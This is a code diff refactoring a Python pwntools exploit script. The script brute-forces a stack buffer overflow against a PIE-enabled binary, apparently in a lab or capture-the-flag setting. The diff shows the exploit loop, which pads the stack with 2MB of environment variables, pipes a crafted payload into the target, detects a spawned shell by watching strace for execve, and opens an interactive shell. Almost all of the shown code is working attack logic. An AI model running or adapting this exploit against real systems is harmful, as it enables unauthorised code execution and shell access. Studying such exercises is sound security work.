@@ -308,6 +308,28 @@ def detect_execve():
 
     return False
 
+def shell(exploit_proc):
+    drain_fd(exploit_proc.proc.stdout.fileno())
+    exploit_proc.interactive()
+    exploit_proc.close()
+    cleanup(0)
+
+def run_exploit(target_bin):
+    exploit_command = f"cat payload - | /mnt/binaries/{target_bin} `cat payload`"
+    #passing on 2MB of env vars to fill up the stack
+    exploit_proc = process(exploit_command, shell=True, stdin=PTY, stdout=PTY, stderr=PTY, raw=False, env=env_vars)
+    exploit_proc.sendline()
+    return exploit_proc
+
+def truncate_log():
+    #seek doesnt work, file fills up with \x00
+    with open(log_file_path, 'a+') as log_file:
+        fcntl.flock(log_file, fcntl.LOCK_EX)
+        try:
+            log_file.truncate(0)  #empty log file to reduce load during searches
+            log_file.seek(0)
+        finally:
+            fcntl.flock(log_file, fcntl.LOCK_UN)
 
 def main():
         
@@ -317,51 +339,34 @@ def main():
     args = check_args()
 
     # Extract arguments
-    target = args.target
+    target_bin = args.target
 
     context.log_level='warn'
     # context.log_level = 'debug'
 
     #this program has PIE enabled -> compilation option that changes the location of the executable in every run
 
-    ra_offset = locate_ra(generate_test(), target)
-    construct_payload(ra_offset, target)
+    ra_offset = locate_ra(generate_test(), target_bin)
+    construct_payload(ra_offset, target_bin)
     attach_strace()
 
     #performing brute force attack
-    exploit_command = f"cat payload - | /mnt/binaries/{target} `cat payload`"
-
     i = 0
     while True:
         print(f"Attempt: {i}")
         i += 1
-        
-        #passing on 2MB of env vars to fill up the stack
-        exploit_proc = process(exploit_command, shell=True, stdin=PTY, stdout=PTY, stderr=PTY, raw=False, env=env_vars)
-        exploit_proc.sendline()
+        exploit_proc = run_exploit(target_bin)
         
         try:
             while True:
 
                 if detect_execve():
-                    log.success("Exploit successful, shell spawned!")
-                    drain_fd(exploit_proc.proc.stdout.fileno())
-                    exploit_proc.interactive()
-                    exploit_proc.close()
-                    cleanup(0)
-
+                    shell(exploit_proc)
 
                 output = exploit_proc.recv(timeout=0.2)   # timeout -> give enough time for target bin to read the payload and for recv to consume the content of the pty output buffer: 0.1 was not enough apparently
-                
                 if output:
                     if detect_crash(exploit_proc.pid) or i == 1:
-                        with open(log_file_path, 'a+') as log_file:
-                            fcntl.flock(log_file, fcntl.LOCK_EX)
-                            try:
-                                log_file.truncate(0)  #empty log file to reduce load during searches
-                                log_file.seek(0)
-                            finally:
-                                fcntl.flock(log_file, fcntl.LOCK_UN)
+                        truncate_log()
                         break
                 else:
                     break
